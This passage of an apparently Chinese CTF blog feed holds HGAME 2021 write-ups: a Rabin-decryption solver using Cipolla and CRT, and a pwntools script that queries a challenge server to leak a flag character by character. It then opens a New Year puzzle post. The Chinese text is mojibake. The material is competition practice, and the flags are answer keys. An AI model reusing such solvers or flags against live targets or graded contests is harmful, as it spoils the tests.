boolean">True</span>    sum1 <span class="token operator">=</span> <span class="token number">1</span>    sum2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> times <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> first<span class="token punctuation">:</span>            k1<span class="token punctuation">,</span> k2 <span class="token operator">=</span> power<span class="token punctuation">(</span>k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> w<span class="token punctuation">,</span> p<span class="token punctuation">)</span>            first <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            k1<span class="token punctuation">,</span> k2 <span class="token operator">=</span> power<span class="token punctuation">(</span>k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> w<span class="token punctuation">,</span> p<span class="token punctuation">)</span>        <span class="token keyword">if</span> times <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>            sum1<span class="token punctuation">,</span> sum2 <span class="token operator">=</span> power<span class="token punctuation">(</span>sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">,</span> k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> w<span class="token punctuation">,</span> p<span class="token punctuation">)</span>        times <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> sum1<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">assert</span> gcd<span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    N <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> a<span class="token operator">*</span>b<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        N_i <span class="token operator">=</span> N <span class="token operator">//</span> j        N_i_1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>N_i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        x <span class="token operator">+=</span> i<span class="token operator">*</span>N_i<span class="token operator">*</span>N_i_1    <span class="token keyword">return</span> x <span class="token operator">%</span> N<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span>    q <span class="token operator">=</span> <span class="token number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span>    n <span class="token operator">=</span> p <span class="token operator">*</span> q    c <span class="token operator">=</span> <span class="token number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span>    get_x1 <span class="token operator">=</span> Cipolla_algorithm<span class="token punctuation">(</span>p<span class="token punctuation">,</span> c<span class="token punctuation">)</span>    get_x2 <span class="token operator">=</span> Cipolla_algorithm<span class="token punctuation">(</span>q<span class="token punctuation">,</span> c<span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>get_x1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> c <span class="token operator">%</span> p    <span class="token keyword">assert</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>get_x2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">==</span> c <span class="token operator">%</span> q    c11 <span class="token operator">=</span> get_x1    c12 <span class="token operator">=</span> p<span class="token operator">-</span>get_x1    c21 <span class="token operator">=</span> get_x2    c22 <span class="token operator">=</span> q<span class="token operator">-</span>get_x2    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'possible m: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>CRT<span class="token punctuation">(</span><span class="token punctuation">[</span>c11<span class="token punctuation">,</span> c21<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'possible m: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>CRT<span class="token punctuation">(</span><span class="token punctuation">[</span>c11<span class="token punctuation">,</span> c22<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'possible m: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>CRT<span class="token punctuation">(</span><span class="token punctuation">[</span>c12<span class="token punctuation">,</span> c21<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'possible m: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>CRT<span class="token punctuation">(</span><span class="token punctuation">[</span>c12<span class="token punctuation">,</span> c22<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># possible m: b'hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}'</span><span class="token comment"># possible m: b'z\x95\x82\x00R3\x1d\x11\xb3\x02Q\xb8\x1f\xcd\xe0\xd0\xbeC\xc31%\xa8]* \t\xdb\xf1v\x87O\xf9 \x15\xbc\xcc+\xe0\xebf\xc4\xd4k\nJ\xfbN\x03\\\xcc\x7f\x00\xa9\x90\xd8l\xef\x98\xce^\xd3\xbd72'</span><span class="token comment"># possible m: b';\x0b\xe7ra \x82\x1fXQ/\xa1V.\xb9\x91\xc2\xd1{\x9d\xe4;n\x9f\xbb\xd7\xeb\x15\xa8\xc6b\x1e\xb0d\x04^\x000\x0f\xa8\x9a\xfe\xa4\x05|\x9d\xa4}s\x05z\x94\xe9\x80\xda=97R\x00?6A\xa3'</span><span class="token comment"># possible m: b'\xb5\xa1ir\xb3S\x9f1\x0bS\x81Yu\xfc\x9ab\x81\x15&gt;\xcf\t\xe3\xcb\xc9\xdb\xe1\xc7\x07\x1fMI\xb0o\x0c[\xae\xf8\x98\x93\xcb\xfbT\xa5\xdah&amp;\x8dLc\xa0\x80j-\xd1?0\xca]\xee\xf7\xaa\x7f9X'</span></code></pre><p><code>hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><blockquote><p>ä½ å†™äº†ä¸€ä¸ªä»€ä¹ˆå¥‡æ€ªçš„debuggerï¼Ÿè¿™ä¸œè¥¿èƒ½ç”¨ï¼Ÿçœ‹èµ·æ¥è§„åˆ™ä¹Ÿä¸å¤ªä¸€æ ·ï¼Ÿ</p><p>nc 101.132.177.131 9999</p></blockquote><p>ç©ºæ ¼ + å›è½¦è¿›è¡Œå•æ­¥è°ƒè¯•ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210208202739016.png"></p><p>å¯ä»¥å‘ç° <code>ecx</code> æ˜¯ä¸‹æ ‡ã€‚</p><p>é¦–å…ˆå¼€å¤´è‚¯å®šæ˜¯ <code>hgame{</code></p><p><del>äºæ˜¯å¯ä»¥å†™ä¸ªè„šæœ¬éå†æ¯ä¸€ä½çš„å­—æ¯ï¼Œå¦‚æœä¸æç¤º <code>Wrong Flag! Try again!</code> åˆ™è¯´æ˜å¯¹äº†ã€‚</del></p><p>åæ¥å‘ç°è¿™ä¹ˆä¸è¡Œã€‚</p><p>å†çœ‹äº†äº¿ä¸‹ï¼Œæ­£ç¡®çš„ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ zf åˆ†åˆ«ä¸º 0 å’Œ 1 çš„ ebx çš„å€¼ç›¸äº’å¼‚æˆ–çš„é‚£ä¸ªã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210211011242566.png"></p><p>äºæ˜¯å°±å¥½åŠäº†ï¼Œç›´æ¥æå–ä¸€ä¸‹ï¼Œå¼‚æˆ–å®Œäº‹ï¼</p><p><em>ï¼ˆæˆ‘æ˜¯ fwï¼Œè¿™ä¸ªè„šæœ¬æˆ‘å†™äº†è´¼ä¹…ï¼Œåˆšå¼€å§‹æ˜¯çˆ†ç ´å¯†ç ï¼Œè·‘ç€ä¸€ç›´ä¸å¯¹ï¼Œåæ¥å‘ç°äº†å¼‚æˆ–å°±è¡Œï¼Œå†åæ¥æ‰å‘ç°å…¶å®æ˜¯å¾ªç¯è·³å‡ºæ¡ä»¶æˆ‘å†™é”™äº†</em></p><p>ï¼ˆçˆ†ç ´è§£/å¼‚æˆ–è§£éƒ½è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""fake_debugger betaMiaoTony"""</span><span class="token keyword">import</span> re<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>timeout <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span>payload_raw<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.132.177.131'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input you flag now!\n"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload_raw<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'--------------INFO--------------\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>            r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'--------------INFO--------------\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR!!!!!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">''</span>        ecx <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"ecx: (\d+)"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        zf <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"zf: (\d+)"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        ebx <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"ebx: (\d+)"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"======================== ecx:"</span><span class="token punctuation">,</span> ecx<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ecx<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload_raw<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> zf <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                ebx0 <span class="token operator">=</span> ebx            <span class="token keyword">else</span><span class="token punctuation">:</span>                s_next <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ebx0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ebx<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Next is"</span><span class="token punctuation">,</span> s_next<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> s_nexts <span class="token operator">=</span> <span class="token string">"hgame{"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================================================&gt;'</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>    isTrue<span class="token punctuation">,</span> i <span class="token operator">=</span> challenge<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">if</span> isTrue<span class="token punctuation">:</span>        s <span class="token operator">+=</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210211013515839.png" alt="flag"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç¬¬äºŒå‘¨é¢˜ç›®è¿˜å¥½è¿˜å¥½ã€‚</p><p>AK äº† Miscï¼Œåé¢å‡ å¤©è¿‡å¹´å°±æ²¡çœ‹äº† 233.</p><p>å–µå‘œï¼Œbinary å¥½éš¾ä¸ä¼šåšï¼Œå˜¤å˜¤å˜¤ã€‚<em>ï¼ˆæŠ„ç¬¬ä¸€å‘¨çš„ï¼Œæˆ‘æ˜¯ fw å¥½èœå•Š</em></p><p><strong>æ–°å¹´å¿«ä¹å–µï¼</strong></p><p>æœ‰å…´è¶£çš„è¯æ¬¢è¿æ¥çœ‹çœ‹å’±è‡ªå·±æ•´çš„ MeowGame è§£è°œé—¯å…³å§ï¼Œè¯¦è§ <a href="https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/">2021 ç‰›å¹´å¤§å‰ï¼åˆæ˜¯ä¸€å¹´è§£è°œé—¯å…³</a>ã€‚</p><p>ï¼ˆæºœäº†æºœäº†</p><!-----### The Password> https://1.oss.hgame2021.vidar.club/thepassword.html>> Tinmixå’Œæœ‹å‹ä¸€èµ·å»ç©å¯†å®¤é€ƒè„±,ä½†æ˜¯ç”±äºçªå‘æƒ…å†µ,Tinmixè¢«é”åœ¨äº†ä¸€é—´å¯†å®¤é‡Œ,äºæ˜¯å¼€å§‹å››å¤„æ‘¸ç´¢,æ˜æš—çš„ç¯å…‰ä¸‹,Tinmixå‘ç°å¯†å®¤æœ‰ä¸€å—å¤§åœ†ç›˜,è¢«äººå·¥åˆ†å‰²æˆäº†7å—å°åœ†ç›˜,ä½†ç”±äºåˆšå¼€å§‹æ²¡æ³¨æ„,æ¯ä¸ªåœ†ç›˜å·²ç»è¢«æ—‹è½¬è¿‡äº†,ä½†Tinmixè®°ä½äº†æ—‹è½¬çš„è¿‡ç¨‹å’Œç»“æœ<pre class="language-none"><code class="language-none">y_1&#x3D;x_1âŠ•n_1âŠ•(x_1â‹™7)âŠ•(x_1â‹˜3) y_2&#x3D;x_2âŠ•n_2âŠ•(x_2â‹™4)âŠ•(x_2â‹˜9) y_3&#x3D;x_3âŠ•n_3âŠ•(x_3â‹™2)âŠ•(x_3â‹˜5) y_4&#x3D;x_4âŠ•n_4âŠ•(x_4â‹™6)âŠ•(x_4â‹˜13) y_5&#x3D;x_5âŠ•n_5âŠ•(x_5â‹™8)âŠ•(x_5â‹™16) y_6&#x3D;x_6âŠ•n_6âŠ•(x_6â‹™5)âŠ•(x_6â‹˜7) y_7&#x3D;x_7âŠ•n_7âŠ•(x_7â‹™2)âŠ•(x_7â‹˜5) (y_1,n_1) &#x3D; (15789597796041222200,14750142427529922)(y_2,n_2) &#x3D; (8279663441787235887,2802568775308984)(y_3,n_3) &#x3D; (9666438290109535850,15697145971486341)(y_4,n_4) &#x3D; (10529571502219113153,9110411034859362)(y_5,n_5) &#x3D; (8020289479524135048,4092084344173014)(y_6,n_6) &#x3D; (10914636017953100490,2242282628961085)(y_7,n_7) &#x3D; (4622436850708129231,10750832281632461)</code></pre><blockquote><p><strong>å®šä¹‰</strong></p><p>â‹™è¡¨ç¤ºå¾ªç¯å³ç§»<br> â‹˜è¡¨ç¤ºå¾ªç¯å·¦ç§»<br> âŠ•è¡¨ç¤ºå¼‚æˆ–è¿ç®—</p><p><strong>hint</strong></p></blockquote><p>â€”â€”&gt;</p>-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 ç‰›å¹´å¤§å‰ï¼åˆæ˜¯ä¸€å¹´è§£è°œé—¯å…³</title>
      <link href="2021/02/12/CTF_2021HappyChineseNewYear/"/>
      <url>2021/02/12/CTF_2021HappyChineseNewYear/</url>
      
        <content type="html"><![CDATA[<h2 id="ç‰›å¹´å¿«ä¹"><a href="#ç‰›å¹´å¿«ä¹" class="headerlink" title="ç‰›å¹´å¿«ä¹"></a>ç‰›å¹´å¿«ä¹</h2><p>åˆšåˆšè¿‡å»çš„åºšå­é¼ å¹´æ˜¯æä¸å¹³å‡¡çš„ä¸€å¹´ï¼Œè€Œä»Šè¾›ä¸‘ç‰›å¹´å¦‚çº¦è€Œè‡³ã€‚</p><p><strong>ç¥å¤§å®¶åœ¨æ–°çš„ä¸€å¹´é‡Œèº«ä½“å¥åº·ï¼Œä¸‡äº‹é¡ºæ„ï¼Œç‰›æ°”å†²å¤©ï¼Œç‰›è½¬ä¹¾å¤ï¼</strong></p><br><hr><br><h2 id="ç¢ç¢å¿µ"><a href="#ç¢ç¢å¿µ" class="headerlink" title="ç¢ç¢å¿µ"></a>ç¢ç¢å¿µ</h2><p>ä¸å¥½æ„æ€ï¼Œä¹…ç­‰äº†ã€‚</p><p><img src="/2021/02/12/CTF_2021HappyChineseNewYear/gugugu.webp" alt="å’•å’•å’•"></p><p><em>ï¼ˆæ„Ÿè°¢ @CircultCoder å¤§ä½¬å¼€å‘çš„æœºå™¨äººç”Ÿæˆçš„è¡¨æƒ…åŒ…</em></p><p>æ®è¯´ <a href="https://miaotony.xyz/2020/01/25/CTF_2020HappyChineseNewYear/">å»å¹´çš„é—¯å…³é¢˜ç›®</a> ä¸€ç¯å¥—ä¸€ç¯å¥—å¨ƒå¤ªæ·±äº†ï¼Œåˆ°æœ€åæ²¡å‡ ä¸ªäººåšåˆ°äº†æœ€åä¸€æ­¥ï¼Œå–µå‘œï¼</p><p>å–µå–µå†³å®šè¿™æ¬¡ä¸å¼„è¿™ä¹ˆæ·±äº†â€¦â€¦</p><p>ä¸å¦‚å…ˆè§£å¼€ç¬¬ä¸€ä¸ª flagï¼Œåé¢å†æ”¾å‡ºå‰©ä¸‹å‡ é¢˜çš„å…¥å£ï¼Œè¿™æ ·å¯èƒ½ä¼šå¥½ä¸€äº›äº†å§ï¼ˆ</p><br><hr><br><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>è¿™æ¬¡è¿˜æ˜¯ <strong>ä»¥ Misc é¢˜ç›®ä¸ºä¸»</strong>ï¼Œçœ‹å¿ƒæƒ…åé¢ä¼šä¸ä¼šåŠ ç‚¹é¢˜ã€‚</p><p><del>å¼€å±€ä¸€å¼ å›¾ï¼Œå‰©ä¸‹çš„å…¨é çŒœ</del></p><p>ä¿—è¯è¯´çš„å¥½ï¼Œé‡åˆ°å›°éš¾ï¼Œç¡å¤§è§‰ï¼<em>ï¼ˆSIGSLEEP</em></p><p>é‚£å°±ä»è¿™å¼ å›¾å¼€å§‹å§ã€‚</p><p><img src="/2021/02/12/CTF_2021HappyChineseNewYear/sleep.jpg" alt="sleep"></p><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ <a href="https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/sleep.jpg">ç‚¹å‡»è¿™é‡Œ</a> ä¸‹è½½åŸå›¾ã€‚</p><p>é™¤ç‰¹åˆ«æ³¨æ˜å¤–ï¼Œ<strong>flag å½¢å¼å‡ä¸º <code>miao{.+}</code></strong> ã€‚</p><p><strong>æ³¨æ„è§£å‡ºæ¥çš„ flagã€çº¢åŒ…å£ä»¤ ä¸è¦éšä¾¿å‘ç»™åˆ«äººå•Šï¼ï¼ï¼</strong></p><p>é¢„è®¡è¿™æ¬¡è§£è°œåº”è¯¥ä¼š <del>æŒç»­å¥½å‡ å¤©</del>ï¼Œæ‰€ä»¥ WriteUp ä»€ä¹ˆçš„åšå‡ºæ¥çš„å¸ˆå‚…æ™šå‡ å¤©å†å‘å§ Orz</p><p>ç”±äºå„ç§å› ç´ ï¼Œå‡ºé¢˜å’•äº†æœ‰ä¸€æ®µæ—¶é—´ï¼Œéå¸¸ä¸å¥½æ„æ€å–µå‘œå‘œã€‚</p><br><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><p>ä¸‹é¢æ˜¯é’ˆå¯¹ <strong>ç¬¬ä¸€é¢˜ï¼ˆTask1ï¼‰</strong> çš„ã€‚</p><ol><li><p>æŸä¸€æ­¥ä¸­çš„åŸŸåï¼Œå½¢å¼ä¸éœ€è¦æ”¹åŠ¨ï¼Œæ‰“ä¸å¼€æ˜¯æ­£å¸¸çš„ã€‚<br>å•Šä½ æ‰“å¾—å¼€ï¼Ÿæ²¡äº‹äº†è¿™æ¡ hint å¯¹ä½ æ¥è¯´æ²¡å¿…è¦äº†ã€‚</p></li><li><p>å¦‚æœå‹ç¼©åŒ…æ³¨é‡Šä¹±ç äº†ï¼Œè¯·ä½¿ç”¨ utf-8ã€‚<br>ä¸å¥½æ„æ€ï¼Œä¸‹æ¬¡ä¸ç”¨ä¸­æ–‡äº†ã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œä¹‹åéƒ½è‹±æ–‡äº†ã€‚<br>å¦‚æœè¿˜ä¸è¡Œçš„è¯ TG è”ç³»ã€‚</p></li><li><p>æ®è¯´æ ¡å†…æŸä¸ªç³»ç»Ÿä¸Šä¼ å‹ç¼©åŒ…åªèƒ½æ˜¯ rarï¼Œå¥‡æ€ªçš„æƒ³æ³•å¢åŠ äº†ã€‚</p></li><li><p>å–µå–µæœ‰æ—¶å€™ç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›åå…­è¿›åˆ¶ç¼–è¾‘å™¨é‡Œæ”¹ä¸œè¥¿ï¼Œä¸€ä¸å°å¿ƒæ–‡ä»¶æŸåäº†æ‰“ä¸å¼€äº†ã€‚</p></li><li><p>è¡¥å…… hint1ï¼Œæƒ³æƒ³ä¸­æ–‡åŸŸåçš„åŸç†ï¼Œä¸å¦‚åˆ°æµè§ˆå™¨é‡Œæ‰“å¼€ Network çœ‹çœ‹ Host é•¿å•¥æ ·ã€‚<br>ç„¶åå†æƒ³æƒ³åŸŸåé™¤äº†ç”¨æ¥è§£æè¿˜èƒ½å¹²ä»€ä¹ˆã€‚</p></li><li><p>è¡¥å…… hint3&amp;4ï¼Œå¯¹æ¯”çœ‹çœ‹ zip æ–‡ä»¶å¤´é•¿å•¥æ ·ã€‚</p></li><li><p>è¡¥å…… hint5ï¼Œå–µå–µå‡†å¤‡å¼€ä¸ªè‡ªå·±çš„<del>é‚®å±€</del>ï¼ˆé›¾ï¼Œæ˜¯åŸŸåé‚®ç®±ã€‚ä¸ºäº†ç†Ÿæ‚‰æµç¨‹ï¼Œå…ˆç»™åŸŸåé…äº†ä¸ªå¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œé¡ºä¾¿æŠŠä¸€ä¸²å¸¦ <code>miao</code> çš„å­—ç¬¦ç”»æ‰”åœ¨é‡Œé¢äº†ã€‚<br>ã€Œçœ‹ä¸Šå»è¿˜ä¸é”™ï¼Œåº”è¯¥æ²¡äººå‘ç°è¿™ä¸ªå½©è›‹å§ qwqã€</p></li><li><p><strong><em>[Important]</em></strong> æ®è¯´å¤§éƒ¨åˆ†äººè¢«å¡åœ¨äº†æå–å‹ç¼©åŒ…çš„é‚£ä¸€æ­¥ï¼Œè¿™æ˜¯å–µå–µæ²¡æƒ³åˆ°çš„ï¼Œé‚£å¹²è„†å’±ä»¬è·³è¿‡è¿™ä¸€æ­¥å¥½äº†ã€‚å–µå–µè¯´è¿™å›è¦ç™½ç»™äº†ï¼Œç›´æ¥ç»™å‡ºä¸€ä¸ªä¸éœ€è¦æ”¹æ–‡ä»¶å¤´çš„ç‰ˆæœ¬ï¼Œ<a href="https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/sleep_fix.jpg">ç‚¹å‡»è¿™é‡Œä¸‹è½½</a> å§ï¼</p><p><img src="/2021/02/12/CTF_2021HappyChineseNewYear/whitegive.webp" alt="whitegive.webp"></p></li></ol><p><del>æœ‰é—®é¢˜å¯ä»¥ Telegram ä¸Šè”ç³» <a href="https://t.me/meow_portal_bot">@meow_portal_bot</a>ï¼Œå‘é‚®ä»¶ä¹Ÿè¡Œï¼ˆ</del></p><p>å¼€äº†ä¸€ä¸ª <strong>Telegram Chat â€”â€” <a href="https://t.me/joinchat/IIwJn0xGBeQHMDNs">MeowGame 2021</a></strong> ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬æ¥ç© 